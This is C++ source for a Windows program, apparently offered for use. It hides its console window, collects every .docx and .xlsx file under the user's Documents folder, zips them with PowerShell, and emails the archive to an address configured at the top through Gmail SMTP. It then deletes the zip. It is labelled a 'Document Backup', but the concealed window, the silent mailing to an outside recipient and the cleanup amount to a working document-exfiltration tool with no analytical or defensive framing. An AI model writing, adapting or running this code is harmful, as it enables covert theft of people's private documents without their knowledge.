#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>

#pragma comment(lib, "shell32.lib")

// Configuration - EDIT THESE
const char* SMTP_SERVER = "smtp.gmail.com";      // Your SMTP server
const int SMTP_PORT = 587;                       // Usually 587 (TLS) or 465 (SSL)
const char* EMAIL_FROM = ""; // Sender address
const char* EMAIL_TO = "";      // Destination address
const char* EMAIL_PASSWORD = ""; // App-specific password

void FindDocumentsRecursive(const std::wstring& path, std::vector<std::wstring>& files) {
    WIN32_FIND_DATAW findData;
    std::wstring searchPath = path + L"\\*";

    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        std::wstring name = findData.cFileName;
        if (name == L"." || name == L"..") continue;

        std::wstring fullPath = path + L"\\" + name;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            FindDocumentsRecursive(fullPath, files);
        }
        else {
            // Check for .docx and .xlsx (case insensitive)
            size_t len = name.length();
            if (len > 5) {
                std::wstring ext = name.substr(len - 5);
                if (ext == L".docx" || ext == L".docx" ||
                    (len > 5 && (name.substr(len - 5) == L".xlsx" ||
                        name.substr(len - 5) == L".xlsx"))) {
                    files.push_back(fullPath);
                }
            }
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
}

std::wstring GetDocumentsPath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, path))) {
        return std::wstring(path);
    }
    // Fallback
    return std::wstring(L"C:\\Users\\") +
        std::wstring(_wgetenv(L"USERNAME")) +
        std::wstring(L"\\Documents");
}

bool CreateZipFile(const std::wstring& docsPath, const std::wstring& zipPath) {
    // Build PowerShell command that changes directory first
    std::wstring psCmd = L"powershell -NoProfile -Command \""
        L"Set-Location -LiteralPath '" + docsPath + L"'; "
        L"Get-ChildItem -Recurse -Include *.docx,*.xlsx | "
        L"Compress-Archive -DestinationPath '" + zipPath + L"' -Force\"";

    // Convert to multibyte and execute
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, psCmd.c_str(), -1, NULL, 0, NULL, NULL);
    std::string cmd(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, psCmd.c_str(), -1, &cmd[0], size_needed, NULL, NULL);

    int result = system(cmd.c_str());
    // Check if zip was created
    DWORD attribs = GetFileAttributesW(zipPath.c_str());
    if (attribs != INVALID_FILE_ATTRIBUTES) {
        LARGE_INTEGER size;
        HANDLE hFile = CreateFileW(zipPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            GetFileSizeEx(hFile, &size);
            CloseHandle(hFile);
            return true;
        }
    }

    return false;
}

bool SendEmail(const std::wstring& attachmentPath) {
    // Build PowerShell Send-MailMessage command
    // Note: For Gmail, use an App Password, not your regular password
    std::wstring psCmd = L"powershell -Command \"";
    psCmd += L"$pass = ConvertTo-SecureString '" +
        std::wstring(EMAIL_PASSWORD, EMAIL_PASSWORD + strlen(EMAIL_PASSWORD)) +
        L"' -AsPlainText -Force; ";
    psCmd += L"$cred = New-Object System.Management.Automation.PSCredential ('" +
        std::wstring(EMAIL_FROM, EMAIL_FROM + strlen(EMAIL_FROM)) +
        L"', $pass); ";
    psCmd += L"Send-MailMessage -From '" +
        std::wstring(EMAIL_FROM, EMAIL_FROM + strlen(EMAIL_FROM)) +
        L"' -To '" +
        std::wstring(EMAIL_TO, EMAIL_TO + strlen(EMAIL_TO)) +
        L"' -Subject 'Document Backup' -Body 'See attached files' ";
    psCmd += L"-SmtpServer '" +
        std::wstring(SMTP_SERVER, SMTP_SERVER + strlen(SMTP_SERVER)) +
        L"' -Port " + std::to_wstring(SMTP_PORT) +
        L" -UseSsl -Credential $cred ";
    psCmd += L"-Attachments '" + attachmentPath + L"'\"";

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, psCmd.c_str(), -1, NULL, 0, NULL, NULL);
    std::string cmd(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, psCmd.c_str(), -1, &cmd[0], size_needed, NULL, NULL);

    int result = system(cmd.c_str());
    return (result == 0);
}

int main() {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::wcout << L"Scanning Documents folder...\n";

    // Get Documents path
    std::wstring docsPath = GetDocumentsPath();
    std::wcout << L"Path: " << docsPath << L"\n";

    // Find files
    std::vector<std::wstring> files;
    FindDocumentsRecursive(docsPath, files);

    std::wcout << L"Found " << files.size() << L" files\n";

    if (files.empty()) {
        return 0;
    }

    // Create zip in temp folder
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring zipPath = std::wstring(tempPath) + L"\\docs_backup.zip";

    std::wcout << L"Compressing to: " << zipPath << L"\n";
    if (!CreateZipFile(docsPath, zipPath)) {
        std::wcerr << L"Failed to create zip\n";
        return 1;
    }

    std::wcout << L"Sending email...\n";
    if (SendEmail(zipPath)) {
        std::wcout << L"Email sent successfully\n";
    }
    else {
        std::wcerr << L"Failed to send email\n";
    }

    // Cleanup
    DeleteFileW(zipPath.c_str());

    return 0;
}
